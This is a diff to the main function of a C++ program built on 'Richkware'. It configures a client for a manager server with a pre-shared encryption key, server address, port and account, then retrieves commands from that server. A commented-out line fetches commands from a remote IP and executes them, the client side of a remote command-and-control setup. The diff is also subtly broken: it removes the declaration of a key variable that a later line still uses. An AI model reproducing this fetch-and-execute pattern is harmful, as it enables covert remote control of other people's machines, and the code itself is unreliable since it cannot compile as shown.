@@ -10,15 +10,20 @@
 
 int main() {
     const char *appName = "Richk";
-    const char *defaultEncryptionKey = "richktest"; // pre-shared key with RMS, to enable encryption before receiving a server-side generated key
-    const char *serverAddress = "127.0.0.1"; // Richkware-Manager-Server IP address
-    const char *port = "8080"; // Richkware-Manager-Server TCP port
-    const char *associatedUser = "richk@i.it"; // account in RMS which is linked to
-//    int timeoutUploadInfo = 5000;
-    // init framework
-    Richkware richkware(appName, defaultEncryptionKey, serverAddress, port, associatedUser);
+    RmsInfo rmsInfo(
+            "richktest",
+            "127.0.0.1",
+            "8080",
+            "Richkware-Manager-Server",
+            "richk@i.it"
+    );
 
-    // PUT YOUR CODE HERE
+    // with RichkwareManagerServer
+    Richkware richkware(appName, rmsInfo);
+    // without RichkwareManagerServer
+    //Richkware richkware(appName, defaultEncryptionKey);
+
+
 //    richkware.network.fetchCommand("172.17.238.81", "8080", "er@fv.it", "Richk");
 //    richkware.executeCommands();
     std::vector<std::string> commands = richkware.getCommands(defaultEncryptionKey);
